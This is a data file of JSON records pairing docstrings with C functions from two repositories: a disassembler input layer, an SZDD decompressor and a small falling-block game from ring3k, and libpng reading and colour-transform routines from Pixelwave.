{"docstring": "/* -----------------------------------------------------------------------------\n * inp_move() - Move ahead n input bytes.\n * -----------------------------------------------------------------------------\n */\n", "func_signal": "extern void\ninp_move(struct ud* u, size_t n)", "code": "{\n  while (n--)\n\tinp_next(u);\n}", "path": "libudis86\\input.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "// debounce...\n", "func_signal": "BOOL check_pressed( ULONG key )", "code": "{\n\tBOOL ret;\n\tULONG val = GetAsyncKeyState( key );\n\tret = ((val & 0x8000) && !(key_states[key] & 0x8000));\n\tkey_states[key] = val;\n\treturn ret;\n}", "path": "programs\\minitris\\minitris.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "/* -----------------------------------------------------------------------------\n * inp_next() - Loads and returns the next byte from input.\n *\n * inp_curr and inp_fill are pointers to the cache. The program is written based\n * on the property that they are 8-bits in size, and will eventually wrap around\n * forming a circular buffer. So, the size of the cache is 256 in size, kind of\n * unnecessary yet optimized.\n *\n * A buffer inp_sess stores the bytes disassembled for a single session.\n * -----------------------------------------------------------------------------\n */\n", "func_signal": "extern uint8_t inp_next(struct ud* u)", "code": "{\n  int c = -1;\n  /* if current pointer is not upto the fill point in the \n   * input cache.\n   */\n  if ( u->inp_curr != u->inp_fill ) {\n\tc = u->inp_cache[ ++u->inp_curr ];\n  /* if !end-of-input, call the input hook and get a byte */\n  } else if ( u->inp_end || ( c = u->inp_hook( u ) ) == -1 ) {\n\t/* end-of-input, mark it as an error, since the decoder,\n\t * expected a byte more.\n\t */\n\tu->error = 1;\n\t/* flag end of input */\n\tu->inp_end = 1;\n\treturn 0;\n  } else {\n\t/* increment pointers, we have a new byte.  */\n\tu->inp_curr = ++u->inp_fill;\n\t/* add the byte to the cache */\n\tu->inp_cache[ u->inp_fill ] = c;\n  }\n  /* record bytes input per decode-session. */\n  u->inp_sess[ u->inp_ctr++ ] = c;\n  /* return byte */\n  return ( uint8_t ) c;\n}", "path": "libudis86\\input.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "/***************************************\n * SZDDD_CLOSE\n ***************************************\n * closes an SZDD file\n */\n", "func_signal": "static void szddd_close(struct msszdd_decompressor *self,\n\t\t\tstruct msszddd_header *szdd)", "code": "{\n  struct msszdd_decompressor_p *this = (struct msszdd_decompressor_p *) self;\n  struct msszddd_header_p *szdd_p = (struct msszddd_header_p *) szdd;\n\n  if (!this) return;\n  if (!this->system) {\n    this->error = MSPACK_ERR_ARGS;\n    return;\n  }\n\n  /* close the file handle associated */\n  if (szdd_p->fh) {\n    this->system->close(szdd_p->fh);\n  }\n\n  /* free the memory associated */\n  this->system->free(szdd);\n\n  this->error = MSPACK_ERR_OK;\n}", "path": "libmspack\\szddd.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "/***************************************\n * SZDDD_DECOMPRESS\n ***************************************\n * unpacks directly from input to output\n */\n", "func_signal": "static int szddd_decompress(struct msszdd_decompressor *self,\n\t\t\t    char *input, char *output)", "code": "{\n  struct msszdd_decompressor_p *this = (struct msszdd_decompressor_p *) self;\n  struct msszddd_header_p szdd;\n  struct mspack_system *sys;\n  struct mspack_file *fh;\n  int error = MSPACK_ERR_OK;\n\n  if (!this) return MSPACK_ERR_ARGS;\n  sys = this->system;\n\n  if ((fh = sys->open(sys, input, MSPACK_SYS_OPEN_READ))) {\n    szdd.fh = fh;\n    error = szddd_read_headers(sys, fh, (struct msszddd_header *) &szdd);\n    if (error == MSPACK_ERR_OK) {\n      error = szddd_extract(self, (struct msszddd_header *) &szdd, output);\n    }\n    sys->close(fh);\n  }\n  else {\n    error = MSPACK_ERR_OPEN;\n  }\n  return this->error = error;\n}", "path": "libmspack\\szddd.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "/***************************************\n * SZDDD_ERROR\n ***************************************\n * returns the last error that occurred\n */\n", "func_signal": "static int szddd_error(struct msszdd_decompressor *self)", "code": "{\n  struct msszdd_decompressor_p *this = (struct msszdd_decompressor_p *) self;\n  return (this) ? this->error : MSPACK_ERR_ARGS;\n}", "path": "libmspack\\szddd.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "/* =============================================================================\n * ud_inp_set_hook() - Sets input hook.\n * =============================================================================\n */\n", "func_signal": "extern void \nud_set_input_hook(register struct ud* u, int (*hook)(struct ud*))", "code": "{\n  u->inp_hook = hook;\n  inp_init(u);\n}", "path": "libudis86\\input.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "/* -----------------------------------------------------------------------------\n * inp_peek() - Peek into the next byte in source. \n * -----------------------------------------------------------------------------\n */\n", "func_signal": "extern uint8_t\ninp_peek(struct ud* u)", "code": "{\n  uint8_t r = inp_next(u);\n  if ( !u->error ) inp_back(u); /* Don't backup if there was an error */\n  return r;\n}", "path": "libudis86\\input.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "/***************************************\n * MSPACK_CREATE_SZDD_DECOMPRESSOR\n ***************************************\n * constructor\n */\n", "func_signal": "struct msszdd_decompressor *\n  mspack_create_szdd_decompressor(struct mspack_system *sys)", "code": "{\n  struct msszdd_decompressor_p *this = NULL;\n\n  if (!sys) sys = mspack_default_system;\n  if (!mspack_valid_system(sys)) return NULL;\n\n  if ((this = sys->alloc(sys, sizeof(struct msszdd_decompressor_p)))) {\n    this->base.open       = &szddd_open;\n    this->base.close      = &szddd_close;\n    this->base.extract    = &szddd_extract;\n    this->base.decompress = &szddd_decompress;\n    this->base.last_error = &szddd_error;\n    this->system          = sys;\n    this->error           = MSPACK_ERR_OK;\n  }\n  return (struct msszdd_decompressor *) this;\n}", "path": "libmspack\\szddd.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "/***************************************\n * SZDDD_EXTRACT\n ***************************************\n * decompresses an SZDD file\n */\n", "func_signal": "static int szddd_extract(struct msszdd_decompressor *self,\n\t\t\t struct msszddd_header *szdd, char *filename)", "code": "{\n  struct msszdd_decompressor_p *this = (struct msszdd_decompressor_p *) self;\n  struct mspack_system *sys;\n  //struct mspack_file *outfh;\n\n  if (!this) return MSPACK_ERR_ARGS;\n  sys = this->system;\n  // something missing here?\n  assert(0);\n  return 0;\n}", "path": "libmspack\\szddd.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "/* -----------------------------------------------------------------------------\n * inp_back() - Move back a single byte in the stream.\n * -----------------------------------------------------------------------------\n */\n", "func_signal": "extern void\ninp_back(struct ud* u)", "code": "{\n  if ( u->inp_ctr > 0 ) {\n\t--u->inp_curr;\n\t--u->inp_ctr;\n  }\n}", "path": "libudis86\\input.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "/***************************************\n * MSPACK_DESTROY_SZDD_DECOMPRESSOR\n ***************************************\n * destructor\n */\n", "func_signal": "void mspack_destroy_szdd_decompressor(struct msszdd_decompressor *self)", "code": "{\n  struct msszdd_decompressor_p *this = (struct msszdd_decompressor_p *) self;\n  if (this) {\n    struct mspack_system *sys = this->system;\n    sys->free(this);\n  }\n}", "path": "libmspack\\szddd.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "// this is required when we're replacing winlogon\n", "func_signal": "void init_window_station( void )", "code": "{\n\tSECURITY_ATTRIBUTES sa;\n\tHANDLE hwsta, hdesk;\n\n\tsa.nLength = sizeof sa;\n\tsa.lpSecurityDescriptor = 0;\n\tsa.bInheritHandle = TRUE;\n\n\thwsta = CreateWindowStationW( L\"winsta0\", 0, MAXIMUM_ALLOWED, &sa );\n\tSetProcessWindowStation( hwsta );\n\thdesk = CreateDesktopW( L\"Winlogon\", 0, 0, 0, MAXIMUM_ALLOWED, &sa );\n\tSetThreadDesktop( hdesk );\n}", "path": "programs\\minitris\\minitris.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "/***************************************\n * SZDDD_OPEN\n ***************************************\n * opens an SZDD file without decompressing, reads header\n */\n", "func_signal": "static struct msszddd_header *szddd_open(struct msszdd_decompressor *self,\n\t\t\t\t\t char *filename)", "code": "{\n  struct msszdd_decompressor_p *this = (struct msszdd_decompressor_p *) self;\n  struct msszddd_header_p *szdd = NULL;\n  struct mspack_system *sys;\n  struct mspack_file *fh;\n  int error;\n\n  if (!this) return NULL;\n  sys = this->system;\n\n  if ((fh = sys->open(sys, filename, MSPACK_SYS_OPEN_READ))) {\n    if ((szdd = sys->alloc(sys, sizeof(struct msszddd_header_p)))) {\n      szdd->fh = fh;\n      error = szddd_read_headers(sys, fh, (struct msszddd_header *) szdd);\n      if (error) {\n\tszddd_close(self, (struct msszddd_header *) szdd);\n\tszdd = NULL;\n      }\n      this->error = error;\n    }\n    else {\n      this->error = MSPACK_ERR_NOMEMORY;\n    }\n    sys->close(fh);\n  }\n  else {\n    this->error = MSPACK_ERR_OPEN;\n  }\n  return (struct msszddd_header *) szdd;\n}", "path": "libmspack\\szddd.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "/* -----------------------------------------------------------------------------\n * inp_buff_hook() - Hook for buffered inputs.\n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static int \ninp_buff_hook(struct ud* u)", "code": "{\n  if (u->inp_buff < u->inp_buff_end)\n\treturn *u->inp_buff++;\n  else\treturn -1;\n}", "path": "libudis86\\input.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "/* =============================================================================\n * ud_inp_set_buffer() - Set buffer as input.\n * =============================================================================\n */\n", "func_signal": "extern void \nud_set_input_buffer(register struct ud* u, uint8_t* buf, size_t len)", "code": "{\n  u->inp_hook = inp_buff_hook;\n  u->inp_buff = buf;\n  u->inp_buff_end = buf + len;\n  inp_init(u);\n}", "path": "libudis86\\input.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "// polled input, as synchronous input is not supported as yet :(\n", "func_signal": "int polled_winmain( void )", "code": "{\n\tBOOL repaint, restart = TRUE;\n\tULONG count = 0;\n\n\tinit_brushes();\n\n\twhile (1)\n\t{\n\t\tif (restart)\n\t\t{\n\t\t\tclear_board();\n\t\t\tnew_block();\n\t\t\trestart = 0;\n\t\t\tgame_over = FALSE;\n\t\t}\n\n\t\trepaint = 0;\n\t\tif (check_pressed( VK_ESCAPE ))\n\t\t{\n\t\t\trestart = 1;\n\t\t\tcontinue;\n\t\t}\n\t\tif (check_pressed( VK_UP ))\n\t\t\trepaint |= do_rotate();\n\t\tif (check_pressed( VK_DOWN ))\n\t\t\trepaint |= move_down();\n\t\tif (check_pressed( VK_LEFT ))\n\t\t\trepaint |= move_left();\n\t\tif (check_pressed( VK_RIGHT ))\n\t\t\trepaint |= move_right();\n\t\tif (check_pressed( VK_SPACE ))\n\t\t\trepaint |= do_space();\n\n\t\tcount++;\n\t\tif (count>10)\n\t\t{\n\t\t\tdo_timer();\n\t\t\trepaint++;\n\t\t\tcount = 0;\n\t\t}\n\t\tif (repaint)\n\t\t{\n\t\t\tHDC hdc = GetDC( 0 );\n\t\t\tpaint_board( hdc );\n\t\t\tReleaseDC( 0, hdc );\n\t\t}\n\t\tSleep( 50 );\n\t}\n\treturn 0;\n}", "path": "programs\\minitris\\minitris.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "// normal windows program\n", "func_signal": "int window_winmain( HINSTANCE Instance )", "code": "{\n\tWNDCLASS wc;\n\tMSG msg;\n\tHWND hwnd;\n\n\twc.style = 0;\n\twc.lpfnWndProc = minitris_wndproc;\n\twc.cbClsExtra = 0;\n\twc.cbWndExtra = 0;\n\twc.hInstance = Instance;\n\twc.hIcon = 0;\n\twc.hCursor = 0;\n\twc.hbrBackground = GetStockObject( BLACK_BRUSH );\n\twc.lpszMenuName = 0;\n\twc.lpszClassName = \"MINITRIS\";\n\tif (!RegisterClass( &wc ))\n\t{\n\t\tMessageBox( NULL, \"Failed to register class\", \"Error\", MB_OK );\n\t\treturn 0;\n\t}\n\n\thwnd = CreateWindow(\"MINITRIS\", \"Minitris\", WS_VISIBLE|WS_POPUP|WS_DLGFRAME,\n\t\tCW_USEDEFAULT, CW_USEDEFAULT, block_size * board_width, block_size * board_height + 5,\n\t\tNULL, NULL, Instance, NULL);\n\tif (!hwnd)\n\t{\n\t\tMessageBox( NULL, \"Failed to create window\", \"Error\", MB_OK );\n\t\treturn 0;\n\t}\n\n\tinit_brushes();\n\tnew_block();\n\tSetTimer( hwnd, 0, interval, 0 );\n\tPostMessage( hwnd, WM_NULL, 0, 0 );\n\tdprintf(\"Before GetMessage\");\n\twhile (GetMessage( &msg, 0, 0, 0 ))\n\t{\n\t\tdprintf(\"dispatching message\");\n\t\tDispatchMessage( &msg );\n\t\tdprintf(\"dispatched message\");\n\t}\n\n\tDeleteObject( brushes[1] );\n\tDeleteObject( brushes[2] );\n\tDeleteObject( brushes[3] );\n\n\treturn 0;\n}", "path": "programs\\minitris\\minitris.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_read_data(png_structp png_ptr, png_bytep data, png_size_t length)", "code": "{\n   png_debug1(4, \"reading %d bytes\", (int)length);\n \n   if (png_ptr->read_data_fn != NULL)\n      (*(png_ptr->read_data_fn))(png_ptr, data, length);\n   else\n      png_error(png_ptr, \"Call to NULL read function\");\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrio.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* Strip 16 bit depth files to 8 bit depth */\n", "func_signal": "void PNGAPI\npng_set_strip_16(png_structp png_ptr)", "code": "{\n   png_debug(1, \"in png_set_strip_16\");\n\n   if (png_ptr == NULL)\n      return;\n   png_ptr->transformations |= PNG_16_TO_8;\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* Transform the image from the file_gamma to the screen_gamma.  We\n * only do transformations on images where the file_gamma and screen_gamma\n * are not close reciprocals, otherwise it slows things down slightly, and\n * also needlessly introduces small errors.\n *\n * We will turn off gamma transformation later if no semitransparent entries\n * are present in the tRNS array for palette images.  We can't do it here\n * because we don't necessarily have the tRNS chunk yet.\n */\n", "func_signal": "void PNGAPI\npng_set_gamma(png_structp png_ptr, double scrn_gamma, double file_gamma)", "code": "{\n   png_debug(1, \"in png_set_gamma\");\n\n   if (png_ptr == NULL)\n      return;\n\n   if ((fabs(scrn_gamma * file_gamma - 1.0) > PNG_GAMMA_THRESHOLD) ||\n       (png_ptr->color_type & PNG_COLOR_MASK_ALPHA) ||\n       (png_ptr->color_type == PNG_COLOR_TYPE_PALETTE))\n     png_ptr->transformations |= PNG_GAMMA;\n   png_ptr->gamma = (float)file_gamma;\n   png_ptr->screen_gamma = (float)scrn_gamma;\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* Convert a RGB image to a grayscale of the same width.  This allows us,\n * for example, to convert a 24 bpp RGB image into an 8 bpp grayscale image.\n */\n", "func_signal": "void PNGAPI\npng_set_rgb_to_gray(png_structp png_ptr, int error_action, double red,\n   double green)", "code": "{\n   int red_fixed = (int)((float)red*100000.0 + 0.5);\n   int green_fixed = (int)((float)green*100000.0 + 0.5);\n   if (png_ptr == NULL)\n      return;\n   png_set_rgb_to_gray_fixed(png_ptr, error_action, red_fixed, green_fixed);\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_quantize(png_row_infop row_info, png_bytep row,\n    png_bytep palette_lookup, png_bytep quantize_lookup)", "code": "{\n   png_bytep sp, dp;\n   png_uint_32 i;\n   png_uint_32 row_width=row_info->width;\n\n   png_debug(1, \"in png_do_quantize\");\n\n   {\n      if (row_info->color_type == PNG_COLOR_TYPE_RGB &&\n         palette_lookup && row_info->bit_depth == 8)\n      {\n         int r, g, b, p;\n         sp = row;\n         dp = row;\n         for (i = 0; i < row_width; i++)\n         {\n            r = *sp++;\n            g = *sp++;\n            b = *sp++;\n\n            /* This looks real messy, but the compiler will reduce\n             * it down to a reasonable formula.  For example, with\n             * 5 bits per color, we get:\n             * p = (((r >> 3) & 0x1f) << 10) |\n             *    (((g >> 3) & 0x1f) << 5) |\n             *    ((b >> 3) & 0x1f);\n             */\n            p = (((r >> (8 - PNG_QUANTIZE_RED_BITS)) &\n               ((1 << PNG_QUANTIZE_RED_BITS) - 1)) <<\n               (PNG_QUANTIZE_GREEN_BITS + PNG_QUANTIZE_BLUE_BITS)) |\n               (((g >> (8 - PNG_QUANTIZE_GREEN_BITS)) &\n               ((1 << PNG_QUANTIZE_GREEN_BITS) - 1)) <<\n               (PNG_QUANTIZE_BLUE_BITS)) |\n               ((b >> (8 - PNG_QUANTIZE_BLUE_BITS)) &\n               ((1 << PNG_QUANTIZE_BLUE_BITS) - 1));\n\n            *dp++ = palette_lookup[p];\n         }\n         row_info->color_type = PNG_COLOR_TYPE_PALETTE;\n         row_info->channels = 1;\n         row_info->pixel_depth = row_info->bit_depth;\n         row_info->rowbytes = PNG_ROWBYTES(row_info->pixel_depth, row_width);\n      }\n      else if (row_info->color_type == PNG_COLOR_TYPE_RGB_ALPHA &&\n         palette_lookup != NULL && row_info->bit_depth == 8)\n      {\n         int r, g, b, p;\n         sp = row;\n         dp = row;\n         for (i = 0; i < row_width; i++)\n         {\n            r = *sp++;\n            g = *sp++;\n            b = *sp++;\n            sp++;\n\n            p = (((r >> (8 - PNG_QUANTIZE_RED_BITS)) &\n               ((1 << PNG_QUANTIZE_RED_BITS) - 1)) <<\n               (PNG_QUANTIZE_GREEN_BITS + PNG_QUANTIZE_BLUE_BITS)) |\n               (((g >> (8 - PNG_QUANTIZE_GREEN_BITS)) &\n               ((1 << PNG_QUANTIZE_GREEN_BITS) - 1)) <<\n               (PNG_QUANTIZE_BLUE_BITS)) |\n               ((b >> (8 - PNG_QUANTIZE_BLUE_BITS)) &\n               ((1 << PNG_QUANTIZE_BLUE_BITS) - 1));\n\n            *dp++ = palette_lookup[p];\n         }\n         row_info->color_type = PNG_COLOR_TYPE_PALETTE;\n         row_info->channels = 1;\n         row_info->pixel_depth = row_info->bit_depth;\n         row_info->rowbytes = PNG_ROWBYTES(row_info->pixel_depth, row_width);\n      }\n      else if (row_info->color_type == PNG_COLOR_TYPE_PALETTE &&\n         quantize_lookup && row_info->bit_depth == 8)\n      {\n         sp = row;\n         for (i = 0; i < row_width; i++, sp++)\n         {\n            *sp = quantize_lookup[*sp];\n         }\n      }\n   }\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* Build a grayscale palette.  Palette is assumed to be 1 << bit_depth\n * large of png_color.  This lets grayscale images be treated as\n * paletted.  Most useful for gamma correction and simplification\n * of code.\n */\n", "func_signal": "void PNGAPI\npng_build_grayscale_palette(int bit_depth, png_colorp palette)", "code": "{\n   int num_palette;\n   int color_inc;\n   int i;\n   int v;\n\n   png_debug(1, \"in png_do_build_grayscale_palette\");\n\n   if (palette == NULL)\n      return;\n\n   switch (bit_depth)\n   {\n      case 1:\n         num_palette = 2;\n         color_inc = 0xff;\n         break;\n\n      case 2:\n         num_palette = 4;\n         color_inc = 0x55;\n         break;\n\n      case 4:\n         num_palette = 16;\n         color_inc = 0x11;\n         break;\n\n      case 8:\n         num_palette = 256;\n         color_inc = 1;\n         break;\n\n      default:\n         num_palette = 0;\n         color_inc = 0;\n         break;\n   }\n\n   for (i = 0, v = 0; i < num_palette; i++, v += color_inc)\n   {\n      palette[i].red = (png_byte)v;\n      palette[i].green = (png_byte)v;\n      palette[i].blue = (png_byte)v;\n   }\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_gray_to_rgb(png_row_infop row_info, png_bytep row)", "code": "{\n   png_uint_32 i;\n   png_uint_32 row_width = row_info->width;\n\n   png_debug(1, \"in png_do_gray_to_rgb\");\n\n   if (row_info->bit_depth >= 8 &&\n      !(row_info->color_type & PNG_COLOR_MASK_COLOR))\n   {\n      if (row_info->color_type == PNG_COLOR_TYPE_GRAY)\n      {\n         if (row_info->bit_depth == 8)\n         {\n            png_bytep sp = row + (png_size_t)row_width - 1;\n            png_bytep dp = sp  + (png_size_t)row_width * 2;\n            for (i = 0; i < row_width; i++)\n            {\n               *(dp--) = *sp;\n               *(dp--) = *sp;\n               *(dp--) = *(sp--);\n            }\n         }\n         else\n         {\n            png_bytep sp = row + (png_size_t)row_width * 2 - 1;\n            png_bytep dp = sp  + (png_size_t)row_width * 4;\n            for (i = 0; i < row_width; i++)\n            {\n               *(dp--) = *sp;\n               *(dp--) = *(sp - 1);\n               *(dp--) = *sp;\n               *(dp--) = *(sp - 1);\n               *(dp--) = *(sp--);\n               *(dp--) = *(sp--);\n            }\n         }\n      }\n      else if (row_info->color_type == PNG_COLOR_TYPE_GRAY_ALPHA)\n      {\n         if (row_info->bit_depth == 8)\n         {\n            png_bytep sp = row + (png_size_t)row_width * 2 - 1;\n            png_bytep dp = sp  + (png_size_t)row_width * 2;\n            for (i = 0; i < row_width; i++)\n            {\n               *(dp--) = *(sp--);\n               *(dp--) = *sp;\n               *(dp--) = *sp;\n               *(dp--) = *(sp--);\n            }\n         }\n         else\n         {\n            png_bytep sp = row + (png_size_t)row_width * 4 - 1;\n            png_bytep dp = sp  + (png_size_t)row_width * 4;\n            for (i = 0; i < row_width; i++)\n            {\n               *(dp--) = *(sp--);\n               *(dp--) = *(sp--);\n               *(dp--) = *sp;\n               *(dp--) = *(sp - 1);\n               *(dp--) = *sp;\n               *(dp--) = *(sp - 1);\n               *(dp--) = *(sp--);\n               *(dp--) = *(sp--);\n            }\n         }\n      }\n      row_info->channels += (png_byte)2;\n      row_info->color_type |= PNG_COLOR_MASK_COLOR;\n      row_info->pixel_depth = (png_byte)(row_info->channels *\n         row_info->bit_depth);\n      row_info->rowbytes = PNG_ROWBYTES(row_info->pixel_depth, row_width);\n   }\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_read_transform_info(png_structp png_ptr, png_infop info_ptr)", "code": "{\n   png_debug(1, \"in png_read_transform_info\");\n\n#ifdef PNG_READ_EXPAND_SUPPORTED\n   if (png_ptr->transformations & PNG_EXPAND)\n   {\n      if (info_ptr->color_type == PNG_COLOR_TYPE_PALETTE)\n      {\n         if (png_ptr->num_trans &&\n              (png_ptr->transformations & PNG_EXPAND_tRNS))\n            info_ptr->color_type = PNG_COLOR_TYPE_RGB_ALPHA;\n         else\n            info_ptr->color_type = PNG_COLOR_TYPE_RGB;\n         info_ptr->bit_depth = 8;\n         info_ptr->num_trans = 0;\n      }\n      else\n      {\n         if (png_ptr->num_trans)\n         {\n            if (png_ptr->transformations & PNG_EXPAND_tRNS)\n              info_ptr->color_type |= PNG_COLOR_MASK_ALPHA;\n         }\n         if (info_ptr->bit_depth < 8)\n            info_ptr->bit_depth = 8;\n         info_ptr->num_trans = 0;\n      }\n   }\n#endif\n\n#ifdef PNG_READ_BACKGROUND_SUPPORTED\n   if (png_ptr->transformations & PNG_BACKGROUND)\n   {\n      info_ptr->color_type &= ~PNG_COLOR_MASK_ALPHA;\n      info_ptr->num_trans = 0;\n      info_ptr->background = png_ptr->background;\n   }\n#endif\n\n#ifdef PNG_READ_GAMMA_SUPPORTED\n   if (png_ptr->transformations & PNG_GAMMA)\n   {\n#ifdef PNG_FLOATING_POINT_SUPPORTED\n      info_ptr->gamma = png_ptr->gamma;\n#endif\n#ifdef PNG_FIXED_POINT_SUPPORTED\n      info_ptr->int_gamma = png_ptr->int_gamma;\n#endif\n   }\n#endif\n\n#ifdef PNG_READ_16_TO_8_SUPPORTED\n   if ((png_ptr->transformations & PNG_16_TO_8) && (info_ptr->bit_depth == 16))\n      info_ptr->bit_depth = 8;\n#endif\n\n#ifdef PNG_READ_GRAY_TO_RGB_SUPPORTED\n   if (png_ptr->transformations & PNG_GRAY_TO_RGB)\n      info_ptr->color_type |= PNG_COLOR_MASK_COLOR;\n#endif\n\n#ifdef PNG_READ_RGB_TO_GRAY_SUPPORTED\n   if (png_ptr->transformations & PNG_RGB_TO_GRAY)\n      info_ptr->color_type &= ~PNG_COLOR_MASK_COLOR;\n#endif\n\n#ifdef PNG_READ_QUANTIZE_SUPPORTED\n   if (png_ptr->transformations & PNG_QUANTIZE)\n   {\n      if (((info_ptr->color_type == PNG_COLOR_TYPE_RGB) ||\n          (info_ptr->color_type == PNG_COLOR_TYPE_RGB_ALPHA)) &&\n          png_ptr->palette_lookup && info_ptr->bit_depth == 8)\n      {\n         info_ptr->color_type = PNG_COLOR_TYPE_PALETTE;\n      }\n   }\n#endif\n\n#ifdef PNG_READ_PACK_SUPPORTED\n   if ((png_ptr->transformations & PNG_PACK) && (info_ptr->bit_depth < 8))\n      info_ptr->bit_depth = 8;\n#endif\n\n   if (info_ptr->color_type == PNG_COLOR_TYPE_PALETTE)\n      info_ptr->channels = 1;\n   else if (info_ptr->color_type & PNG_COLOR_MASK_COLOR)\n      info_ptr->channels = 3;\n   else\n      info_ptr->channels = 1;\n\n#ifdef PNG_READ_STRIP_ALPHA_SUPPORTED\n   if (png_ptr->flags & PNG_FLAG_STRIP_ALPHA)\n      info_ptr->color_type &= ~PNG_COLOR_MASK_ALPHA;\n#endif\n\n   if (info_ptr->color_type & PNG_COLOR_MASK_ALPHA)\n      info_ptr->channels++;\n\n#ifdef PNG_READ_FILLER_SUPPORTED\n   /* STRIP_ALPHA and FILLER allowed:  MASK_ALPHA bit stripped above */\n   if ((png_ptr->transformations & PNG_FILLER) &&\n       ((info_ptr->color_type == PNG_COLOR_TYPE_RGB) ||\n       (info_ptr->color_type == PNG_COLOR_TYPE_GRAY)))\n   {\n      info_ptr->channels++;\n      /* If adding a true alpha channel not just filler */\n      if (png_ptr->transformations & PNG_ADD_ALPHA)\n        info_ptr->color_type |= PNG_COLOR_MASK_ALPHA;\n   }\n#endif\n\n#if defined(PNG_USER_TRANSFORM_PTR_SUPPORTED) && \\\ndefined(PNG_READ_USER_TRANSFORM_SUPPORTED)\n   if (png_ptr->transformations & PNG_USER_TRANSFORM)\n     {\n       if (info_ptr->bit_depth < png_ptr->user_transform_depth)\n         info_ptr->bit_depth = png_ptr->user_transform_depth;\n       if (info_ptr->channels < png_ptr->user_transform_channels)\n         info_ptr->channels = png_ptr->user_transform_channels;\n     }\n#endif\n\n   info_ptr->pixel_depth = (png_byte)(info_ptr->channels *\n      info_ptr->bit_depth);\n\n   info_ptr->rowbytes = PNG_ROWBYTES(info_ptr->pixel_depth, info_ptr->width);\n\n#ifndef PNG_READ_EXPAND_SUPPORTED\n   if (png_ptr)\n      return;\n#endif\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* Expand grayscale images of less than 8-bit depth to 8 bits. */\n", "func_signal": "void PNGAPI\npng_set_expand_gray_1_2_4_to_8(png_structp png_ptr)", "code": "{\n   png_debug(1, \"in png_set_expand_gray_1_2_4_to_8\");\n\n   if (png_ptr == NULL)\n      return;\n\n   png_ptr->transformations |= PNG_EXPAND;\n   png_ptr->flags &= ~PNG_FLAG_ROW_INIT;\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
